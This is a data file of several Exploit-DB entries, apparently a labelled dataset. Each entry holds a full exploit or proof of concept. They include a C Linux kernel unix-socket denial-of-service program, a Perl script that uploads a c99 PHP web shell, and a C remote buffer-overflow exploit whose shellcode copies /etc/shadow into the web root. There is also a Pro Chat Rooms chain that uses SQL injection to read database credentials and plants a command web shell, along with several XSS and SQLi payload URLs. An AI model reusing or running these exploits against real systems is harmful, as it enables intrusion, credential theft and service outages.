7091,"Linux Kernel < 2.4.36.9/2.6.27.5 - Unix Sockets Local Kernel Panic (Denial of Service) #include <sys/socket.h> #include <sys/un.h> #include <unistd.h> #include <assert.h> #include <err.h> #include <stdlib.h>  static int own_child(int *us) {         int pid;         int s[2];         struct msghdr mh;         char crap[1024];         struct iovec iov;         struct cmsghdr *c;         int *fd;         int rc;          pid = fork();         if (pid == -1)                 err(1, ""fork()"");          if (pid) {               close(us[1]);                  return pid;         }          close(us[0]);          memset(&mh, 0, sizeof(mh));         iov.iov_base = ""a"";         iov.iov_len  = 1;          mh.msg_iov        = &iov;         mh.msg_iovlen     = 1;         mh.msg_control    = crap;         mh.msg_controllen = sizeof(crap);          c = CMSG_FIRSTHDR(&mh);         assert(c);          c->cmsg_level = SOL_SOCKET;         c->cmsg_type  = SCM_RIGHTS;          fd = (int*) CMSG_DATA(c);         assert(fd);          c->cmsg_len = CMSG_LEN(sizeof(int));         mh.msg_controllen = c->cmsg_len;          while (1) {                 if (socketpair(PF_UNIX, SOCK_STREAM, 0, s) == -1)                         err(1, ""socketpair()"");                  *fd = s[0];                  rc = sendmsg(us[1], &mh, 0);                 if (rc == -1)                         err(1, ""sendmsg()"");                  if (rc != iov.iov_len)                         errx(1, ""sent short"");                  close(s[0]);                 close(us[1]);                 us[1] = s[1];         } }  static void own(void) {                static int pid;         static int us[2];         char crap[1024];         char morte[1024];         struct cmsghdr *c;         int rc;         struct msghdr mh;         struct iovec iov;         int *fds;          if (!pid) {                 if (socketpair(PF_UNIX, SOCK_STREAM, 0, us) == -1)                         err(1, ""socketpair()"");                 pid = own_child(us);         }          iov.iov_base = morte;         iov.iov_len  = sizeof(morte);          memset(&mh, 0, sizeof(mh));         mh.msg_iov        = &iov;         mh.msg_iovlen     = 1;         mh.msg_control    = crap;         mh.msg_controllen = sizeof(crap);          rc = recvmsg(us[0], &mh, 0);         if (rc == -1)                 err(1, ""recvmsg()"");          if (rc == 0)                 errx(1, ""EOF"");          c = CMSG_FIRSTHDR(&mh);         assert(c);         assert(c->cmsg_type == SCM_RIGHTS);          fds = (int*) CMSG_DATA(c);         assert(fds);          close(us[0]);         us[0] = *fds; }  int main(int argc, char *argv[]) { 	own(); 	exit(0); }  // milw0rm.com [2008-11-11]",Linux Kernel,1
27502,Connect Daily 3.2.8/3.2.9 - 'ViewDay.html' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/17287/info  Connect Daily is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheetuserStyle.css&dropdown=1&show_stop=0&show_resources0&calendar_id=[code] http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheet=[code] http://www.example.com/ViewDay.html?start=[code],Connect Daily,1
34275,"Pro Chat Rooms 8.2.0 - Multiple Vulnerabilities # Exploit Title: Pro Chat Rooms v8.2.0 - Multiple Vulnerabilities # Google Dork: intitle:""Powered by Pro Chat Rooms"" # Date: 5 August 2014 # Exploit Author: Mike Manzotti @ Dionach Ltd # Vendor Homepage: http://prochatrooms.com # Software Link: http://prochatrooms.com/software.php # Version: v8.2.0 # Tested on: Debian (Apache+MySQL)  1) Stored XSS ===========  Text Chat Room Software of ProoChatRooms is vulnerable to Stored XSS. After registered an account, an attacker can upload a profile picture containing Javascript code as shown below:  POST: http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""uploadedfile""; filename=""nopic333.jpg"" Content-Type: image/jpeg  <script>alert(document.cookie)</script>  By inspecting the response, the web application returns a 32 digits value in the HTML tag ""imgID"" as shown below:  Response: <input type=""hidden"" name=""imgID"" value=""798ae9b06cd900b95ed5a60e02419d4b"">  The picture is uploaded under the directory ""/profiles/uploads"" and is accessible by force browsing to the 32 digits value as shown below:  http://<WEBSITE>/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b>   2) Reflected XSS =============  Text Chat Room Software of ProoChatRooms is vulnerable to Reflected XSS. The parameter ""edit"" is not encoded:  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1&edit=""><script>alert(document.cookie)</script><http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1&edit=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e>   3) SQL Injection =============  Text Chat Room Software of ProoChatRooms is vulnerable to SQL injections. Across the all source code of web application, parameterized queries are used to query the database. However, a lack of data sanitization of three parameters leaves the web application vulnerable to SQLi. The vulnerable parameters are located as shown below:  prochatrooms_v8.2.0/includes/functions.php: ~2437 $params = array( 'password' => md5($password), 'email' => makeSafe($email), 'id' => $id ); $query = ""UPDATE prochatrooms_users               SET email = '"".$email.""',                     password='"".md5($password).""'               WHERE id = '"".$id.""'               "";  prochatrooms_v8.2.0/includes/functions.php: ~2449 $query = ""UPDATE prochatrooms_users               SET email = '"".$email.""'               WHERE id = '"".$id.""'               "";  prochatrooms_v8.2.0/includes/functions.php: ~3110 $query = ""UPDATE prochatrooms_users               SET active = '"".$offlineTime.""', online = '0'               WHERE username = '"".makeSafe($toname).""'               "";  Note that the ""makeSafe"" function is defined as shown below and will protect against XSS attacks only:  prochatrooms_v8.2.0/includes/functions.php: ~125 function makeSafe($data) {       $data = htmlspecialchars($data);        return $data; }   After registering an account, an attacker can exploit the SQL injection by editing the field email as shown below which will retrieve the MD5 hashed password of the administrator:  POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu', email=(select adminLogin from prochatrooms_config) where id ='1';#   The following SQL injection will retrieve the SQL connection string, which probably has clear-text database credentials.  POST http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu', email=(select load_file('/var/www/prochatrooms/includes/db.php')) where id ='1';#     4) Arbitrary File Upload ==================  It is possible to combine the Stored XSS and SQL injection vulnerabilities to upload a web shell on the server.  The following request will upload a PHP web shell and the web application will return a 32 digit value.  POST:  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""uploadedfile""; filename=""m.jpg"" Content-Type: application/octet-stream  <?php system($_GET[cmd]);?>  Response: <input type=""hidden"" name=""imgID"" value=""82d0635538da4eac42da25f8f95f8c45"">  Since the uploaded web shell is without extension it will not be executed:  http://<WEBSITE>/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45> <?php system($_GET[cmd]);?>  Image: [cid:image005.png@01CFB099.8E117F70]  However, exploiting the SQL injection it is possible to rename the file by appending a .php extension  POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1> Content-Disposition: form-data; name=""profileEmail""  mm@1dn.eu' where id ='1'; SELECT load_file('/var/www/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45') INTO OUTFILE '/var/www/prochatrooms/profiles/uploads/s.php';#  Web shell: http://<WEBSITE>/prochatrooms/profiles/uploads/s.php?cmd=id<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/s.php?cmd=id> uid=33(www-data) gid=33(www-data) groups=33(www-data)  Image: [cid:image006.png@01CFB099.8E117F70]   Timeline ======== 19/07/2014: Vendor informed via email 04/08/2014: Vendor informed via email 05/08/2014: Public Disclosure  Kind regards, Mike  ______________________________________________________________________  Disclaimer: This e-mail and any attachments are confidential.  It may contain privileged information and is intended for the named addressee(s) only. It must not be distributed without Dionach Ltd consent. If you are not the intended recipient, please notify the sender immediately and destroy this e-mail.   Any unauthorised copying, disclosure or distribution of the material in this e-mail is strictly forbidden. Unless expressly stated, opinions in this e-mail are those of the individual sender, and not of Dionach Ltd.  Dionach Ltd, Greenford House, London Road, Wheatley, Oxford OX33 1JH Company Registration No. 03908168, VAT No. GB750661242  ______________________________________________________________________","Pro Chat Rooms""",1
32706,"Notepad++ DSpellCheck 1.2.12.0 - Denial of Service # Exploit Title: Notepad++ - DSpellCheck v1.2.12.0 plugin[DOS] # Exploit Author: sajith # Vendor Homepage: http://notepad-plus-plus.org/ # Software Link: http://notepad-plus-plus.org/download/ # vulnerable plugin Version: DSpellCheck v 1.2.12.0 # Tested in: Windows XP SP3 EN,Notepad ++ 6.5.4   POC:   1)install notepadd ++  2)open up plugins tab and select Dspellcheck and click on settings  3)In ""hunspell dictionaries path"" field enter large character say 80000 A's and click on ""apply""   ########################################################## (cf8.4f8): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00690044 ebx=00000000 ecx=00000294 edx=01f56070 esi=01f56060 edi=00000000 eip=7c919fca esp=01d0ed74 ebp=01d0ede8 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 ntdll!RtlpWaitForCriticalSection+0x5b: 7c919fca ff4010 inc dword ptr [eax+10h] ds:0023:00690054=bc5d0050  ####################################################  FAULTING_IP: ntdll!RtlpWaitForCriticalSection+5b 7c919fca ff4010 inc dword ptr [eax+10h]  EXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff) ExceptionAddress: 7c919fca (ntdll!RtlpWaitForCriticalSection+0x0000005b) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000 NumberParameters: 2 Parameter[0]: 00000001 Parameter[1]: 00690054 Attempt to write to address 00690054  FAULTING_THREAD: 000004f8  PROCESS_NAME: notepad++.exe .  FAULTING_MODULE: 7c900000 ntdll  DEBUG_FLR_IMAGE_TIMESTAMP: 52c4419f  ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at ""0x%08lx"" referenced memory at ""0x%08lx"". The memory could not be ""%s"".  EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at ""0x%08lx"" referenced memory at ""0x%08lx"". The memory could not be ""%s"".  EXCEPTION_PARAMETER1: 00000001  EXCEPTION_PARAMETER2: 00690054  WRITE_ADDRESS: 00690054  FOLLOWUP_IP: DSpellCheck!setInfo+577f5 012f4cb5 59 pop ecx  CRITICAL_SECTION: 00f56060 -- (!cs -s 00f56060)  BUGCHECK_STR: APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_WRONG_SYMBOLS  PRIMARY_PROBLEM_CLASS: STRING_DEREFERENCE  DEFAULT_BUCKET_ID: STRING_DEREFERENCE  LAST_CONTROL_TRANSFER: from 7c901046 to 7c919fca  STACK_TEXT: WARNING: Stack unwind information not available. Following frames may be wrong. 01d0ede8 7c901046 00f56060 012feb19 01f56060 ntdll!RtlpWaitForCriticalSection+0x5b 01d0ee00 012f4cb5 00000013 012f8787 00000003 ntdll!RtlEnterCriticalSection+0x46 01d0ee48 012f15f0 908eab95 01654af8 00000000 DSpellCheck!setInfo+0x577f5 01d0ee7c 012f166b 01f54058 0130e360 00000040 DSpellCheck!setInfo+0x54130 01d0ee8c 012aecaa 01f54058 0130e360 01f56056 DSpellCheck!setInfo+0x541ab 01d0ee90 01f54058 0130e360 01f56056 00000000 DSpellCheck!setInfo+0x117ea 01d0ee94 0130e360 01f56056 00000000 016549a8 0x1f54058 01d0ee98 01f56056 00000000 016549a8 00000000 DSpellCheck!setInfo+0x70ea0 01d0ee9c 00000000 016549a8 00000000 00000000 0x1f56056   SYMBOL_STACK_INDEX: 2  SYMBOL_NAME: DSpellCheck!setInfo+577f5  FOLLOWUP_NAME: MachineOwner  MODULE_NAME: DSpellCheck  IMAGE_NAME: DSpellCheck.dll  STACK_COMMAND: ~4s ; kb  BUCKET_ID: WRONG_SYMBOLS  FAILURE_BUCKET_ID: STRING_DEREFERENCE_c0000005_DSpellCheck.dll!setInfo  Followup: MachineOwner  ####################################################",Notepad++ DSpellCheck,1
6674,"FOSS Gallery Public 1.0 - Arbitrary File Upload # FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit # url: http://downloads.sourceforge.net/fossgallery/ # # Author: JosS # mail: sys-project[at]hotmail[dot]com # site: http://spanish-hackers.com # team: Spanish Hackers Team - [SHT] # # This was written for educational purpose. Use it at your own risk. # Author will be not responsible for any damage. # # OUTPUT: # # Exploited sucessfully. # # [+] Info: #    Linux h4x0rz 2.6.18-6-686 #1 SMP Mon Aug 18 08:42:39 UTC 2008 i686 #    uid=33(www-data) gid=33(www-data) groups=33(www-data) #    Safe Mode: OFF (not secure) # # joss@h4x0rz:~/Desktop$   use LWP::UserAgent; use HTTP::Request::Common; use HTTP::Headers; use LWP::UserAgent; use HTTP::Request; use LWP::Simple;  sub lw {  my $SO = $^O; my $linux = """"; if (index(lc($SO),""win"")!=-1){ 		   $linux=""0""; 	    }else{ 		    $linux=""1""; 	    } 		if($linux){ system(""clear""); } else{ system(""cls""); } }  my ($host, $file) = @ARGV ;  if (!$ARGV[0]) {  &lw; print ""\n[x] FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit\n""; print ""[x] written by JosS - sys-project[at]hotmail.com\n""; print ""[x] http://www.spanish-hackers.com/\n\n""; print ""Usage: $0 [host] [file] \n""; print ""if doesn't exist the file: file default is phpshell C99\n\n""; exit; } if (!$ARGV[1]) { $file=""c99.php""; }  &lw;  $host = 'http://'.$host if ($host !~ /^http:/); $host .= ""/"" if ($host !~ /\/\$/);  my $ua = LWP::UserAgent->new(); $ua->timeout(12); my $request = HTTP::Request->new(); my $response; my $header; my $url = $host.""processFiles.php"";  $response = $ua->request(POST $url, Content_Type => 'form-data', 					Content => [ uploadNeed => ""1"", uploadFile0 => [$file]]); $content = $response->content;  if ($content =~ /uploaded sucessful/) { print ""\nExploited sucessfully.\n""; } else { print ""\nExploit failed\n""; exit;}  my $c99=""c99.php"";  chomp ($c99);  if ($file =~ /c99.php/) {  $comando=""?act=cmd&d=/&cmd=/&cmd_txt=1&submit=Execute"";  print ""\n"";   my $final = $host.$c99.$comando;  my $ua = LWP::UserAgent->new;  my $req = HTTP::Request->new(GET => $final);  $ua->timeout(10);  $doc = $ua->request($req)->as_string;    $kernel = $1 if ( $doc =~ m/-a:&nbsp; (.*?)\<\/b>/mosix); $id = $1 if ( $doc =~ m/<b>uid (.*?)\<\/b>/mosix);  $safe = $1 if ( $doc =~ m/color=green> (.*?)\<\/font>/mosix);    print ""[+] Info:\n"";  print ""    $kernel\n""; print ""    uid$id\n"";  print ""    Safe Mode: $safe\n"";  print ""\n"";    }  __EOF__  # milw0rm.com [2008-10-05]",FOSS Gallery Public,0
33596,KnowGate hipergate 4.0.12 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/38094/info  KnowGate hipergate is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  KnowGate hipergate 4.0.12 is vulnerable; other versions may also be affected.   http://www.example.com:8080/hipergate/common/errmsg.jsp?title=%3Cscript%3Ealert%28%22titleXSS%22%29; %3C/script%3E&desc=%3Cscript%3Ealert%28%22descXSS%22%29;%3C/script%3E&resume=_back,KnowGate hipergate,1
20780,"CrossWind CyberScheduler 2.1 - websyncd Remote Buffer Overflow // source: https://www.securityfocus.com/bid/2628/info   CrossWind CyberScheduler is a scheduling and calendaring package. It consists of two distinct parts for - a set of cgi scripts on a web server and a set of daemons (or services) on a database server. Both parts are available for Windows NT, Linux and a range of UNIX platforms including Solaris.  One of the CyberScheduler daemons 'websyncd' (websyncd.exe on Windows NT) contains an exploitable buffer overflow in its timezone string parser. A timezone string is passed to websyncd by the websync.cgi cgi program (websync.exe on NT) through the tzs form variable.  Because websyncd runs as root, a stack overflow allows arbitrary code execution as root. The overflow occurs before any logon credentials are verified by websync.cgi, so unprivileged remote users can exploit this vulnerability.   /* PRIVATE -- DO NOT DISTRIBUTE!!   x-cybershed.c    TimeZONE buffer overflow on cgi script rendering complete control of the stack.    Enrique A. Sanchez Montellano   enrique.sanchez@defcom.com */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/wait.h> #include <sys/stat.h> #include <sys/time.h> #include <netinet/in.h> #include <netdb.h> #include <fcntl.h> #include <time.h> #include <wait.h> #include <errno.h>  #define OFFSET       0 #define ALIGN        0 #define BUFFER       264  /* Definicion de colores */  #define VERDE   ""\E[32m"" #define BRILLOSO   ""\E[1m"" #define NORMAL  ""\E[m"" #define ROJO  ""\E[31m"" #define CELESTE ""\E[36m"" #define AZUL ""\E[34m"" #define AMARILLO ""\E[33m"" #define MORADO ""\E[35m""  //passive port 0x8000 shell (written by agent0nd) //static char Hellcode[]= //""\xeb\x4b\x5f\x87\xfe\x29\xc0\x29\xdb\x40\x89\x46\x04\x40\x89\x06\xb0\x06\x89"" //""\x46\x08\xb0\x66\x43\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x80"" //""\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x29\xc0\x89\x46\x10\xb0\x10\x89\x46"" //""\x08\xb0\x66\x43\xcd\x80\x29\xc0\x40\x89\x46\x04\xb3\x04\xb0\x66\xcd\x80\xeb"" //""\x02\xeb\x4c\x29\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\x43\xcd\x80\x88\xc3\x29"" //""\xc9\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb8\x2e\x62\x69"" //""\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46\x04\x29\xc0\x88\x46\x07\x89"" //""\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x29\xc0"" //""\x40\xcd\x80\xe8\x62\xff\xff\xff"";  /* cp /etc/shadow /var/lib/httpd/htdocs */ static char Hellcode[]= ""\xeb\x3a\x5f\x31\xc0\x89\xfa\x89\x57\x64\x80\xc2\x36\x89\x57\x68\x80\xc2\x33\x80\xea\x30\x89\x57\x6c\x89\x47\x70\x88\x47\x25\x88\x4 7\x38\x88\x47\x62\xb0\x73\x2c\x53\x88\x47\x40\x88\x47\x4c\xb0\x6c\x2c\x61\x89\xfb\x8d\x4f\x64\x31\xd2\xcd\x80\xe8\xc1\xff\xff\xff\x2 f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x73\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x2e\x2e\x2f\x62\x69\x6 e\x2f\x73\x68XAGENT.OND.DEFCOM\x2d\x63\x58\x2f\x62\x69\x6e\x2f\x63\x70\x58\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x58\x2f\x76\x 61\x72\x2f\x6c\x69\x62\x2f\x68\x74\x74\x70\x64\x2f\x68\x74\x64\x6f\x63\x73"";  unsigned long resolver (char *serv) {   struct sockaddr_in sinn;   struct hostent *hent;    hent = gethostbyname (serv);   bzero ((char *) &sinn, sizeof (sinn));   memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);   return sinn.sin_addr.s_addr;  }  unsigned long get_sp(void) {   __asm__(""movl %esp, %eax""); }  void usage(char *name) {   printf(""Usage:\n"");   printf(""%s <victim> <offset> <align> <buffer> \n\n"", name); }  int connex(u_long victim) {   int sockfd;   struct sockaddr_in hostaddr;    if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {    perror(""connex"");    exit(-1);   }    hostaddr.sin_port = htons(80);   hostaddr.sin_addr.s_addr = victim;   hostaddr.sin_family = AF_INET;    if((connect(sockfd, (struct sockaddr *) &hostaddr, sizeof(hostaddr))) < 0 ) {    perror(""connex"");    exit(-1);   }     return sockfd; }  int ataque(int victim, char *command) {   int sockfd, retval, i;   char tmp[256];   fd_set rfds;   struct timeval timer;   char part1[1024] = ""/cgi-bin/websync.cgi?ed=&Es=7x1x101&un=Defcom&hn=lab&rpt=/cybersched/En_US/WebResources&cbn=/cgi-bin/websync.cgi&dow=sun&dmy=Off&tf h=Off&lan=En_US&ix=0&amd=2&epw=WXxiAkS&mrd=-1&mrc=0&mrb=0&bnv=9&ds=7x1x101&tzs="";   char fancy[] = ""Host: 127.0.0.1\nConnection: Keep-Alive\nUser-Agent: Defcom Labs @ Spain version 0.1\nContent-type: aplication/x-www-form-urlencoded\n"";    sockfd = connex(victim);    FD_ZERO(&rfds);   FD_SET(sockfd, &rfds);   timer.tv_sec = 5;   timer.tv_usec = 0;    retval = select(sockfd + 1, NULL, &rfds, NULL, &timer);    if(retval) {    printf(""%s[ + ] Atacking the server ... \n%s"", VERDE, NORMAL);    write(sockfd, ""GET "", strlen(""GET ""));    write(sockfd, part1, strlen(part1));    write(sockfd, command, strlen(command));    write(sockfd, ""\n"", strlen(""\n""));    // Fancy stuff ... LoL!    write(sockfd, fancy, strlen(fancy));    write(sockfd, ""\n\n"", strlen(""\n\n""));    for(i = 0; i < 256; i++) {      tmp[i] = '\0';    }    read(sockfd, tmp, sizeof(tmp));   }   else {    printf(""%sTime out!!!!!\n%s"", ROJO, NORMAL);    exit(-1);   }  }  int main(int argc, char **argv) {   int offset = OFFSET;   int align = ALIGN;   int buffer = BUFFER;   struct hostent *hent;   char *command;   unsigned long addr;   int i, victim;    if(argc < 2) {    usage(argv[0]);    exit(0);   }    if(argc > 2) offset = atoi(argv[2]);   if(argc > 3) align = atoi(argv[3]);   if(argc > 4) buffer = atoi(argv[4]);    if((hent = gethostbyname(argv[1])) == NULL) {    perror(""x-cybersched"");    exit(1);   }    printf(""%sX-Cybersched\n"", AZUL);   printf(""------------------------------------\n"");   printf(""Remote exploit .... by\n"");   printf(""Enrique Sanchez (enrique.sanchez@defcom.com)\n%s"", NORMAL);  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Buffer is %d\n%s"", AMARILLO,  buffer, NORMAL);   printf(""%s[ + DEBUG + ] The size of the shellcode is %d\n%s"", AMARILLO, strlen(Hellcode), NORMAL); #endif    addr = 0xbfffffff - offset;   command = (char *)malloc(buffer);    printf(""%s[ + ] Using addres: 0x%x\n%s"", VERDE, addr, NORMAL);  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    printf(""%s[ + ] Filling buffer for exploitation ... \n%s"", VERDE, NORMAL);    for(i = 0; i < buffer; i += 4) {    *(long *)&command[i] = 0x90909090;   }   *(long *)&command[buffer - 4] = addr;  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    memcpy(command + buffer - strlen(Hellcode) - 4, Hellcode, strlen(Hellcode));  #ifdef DEBUG   printf(""%s[ + DEBUG + ] Command right now is: %s\n\n%s"", AMARILLO, command, NORMAL); #endif    ataque(resolver(argv[1]), command);    return 0; }",CrossWind CyberScheduler,1
26273,"vBulletin 1.0.1 lite/2.x/3.0 - 'joinrequests.php?request' SQL Injection source: https://www.securityfocus.com/bid/14872/info  vBulletin is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  > /joinrequests.php: POST: <do=processjoinrequests&usergroupid=22&request[[SQL-Injection]]=0>",vBulletin,1
19167,"Ipswitch IMail 5.0 / Ipswitch WS_FTP Server 1.0.1/1.0.2 - Local Privilege Escalation source: https://www.securityfocus.com/bid/218/info  Non-administrative Imail and WS_FTP Server users may elevate their privileges to administrator for these applications by modifying a specific registry value. Once a person has obtained administrative privileges, they may use the application interface (locally) to read email, create accounts, delete accounts, etc.   Access the following registry key ""HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\Machine_name\Users\Username"" Modify the Flag value to read ""1920"". 1920 gives the user account administrator permissions to IMail and WS_FTP Server.",Ipswitch WS_FTP Server,1
13902,"Ananda Image Gallery - SQL Injection Exploit Title:Ananda Image Gallery SQL Vulnerable Vendor url:http://www.softwebsnepal.com/ Version:n/a Price:159$ Author: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com] Published: 2010-06-17 Greetz to:Sid3^effects, MaYur, M4n0j, Dark Blue, S1ayer,d3c0d3r,KD and to all ICW members. Spl Greetz to:inj3ct0r.com Team, Andhra hackers.com  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Description:  Unlimited photo upload: This software helps you to upload unlimited photo to you website. click here for Thumbnail  Auto Thumbnail and Auto photo aspect ratio creater: This software automatically create thumbnail of uploaded photo and also mange aspect ratio of the uploaded photo with the thumbnail photo so there will be no photo tear and also you can manage the compression rate of uploaded photo.  Admin Panel: This software comes with admin panel form where you can upload photo, create category and subcategory.   Categories and subcategories: Admin can create unlimited category and subcategory, it is very easy to create any number of hierarchical categories. click here for Thumbnail   Profile Setup : Admin can change profile form control panel, which will appear in contact us page. click here for Thumbnail  Password Setup : Admin can change password form their control panel. click here for Thumbnail  Easy Setup: Setting up this software is very easy. Just unzip the files and upload it to your server. then just set one file and you are ready to go.  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Vulnerability:  *SQLi Vulnerability  DEMO URL :  http://[site]/gallery/default.asp?id=[sqli]   # 0day n0 m0re # # L0rd CrusAd3r #   --  With R3gards, L0rd CrusAd3r",Ananda Image Gallery,1
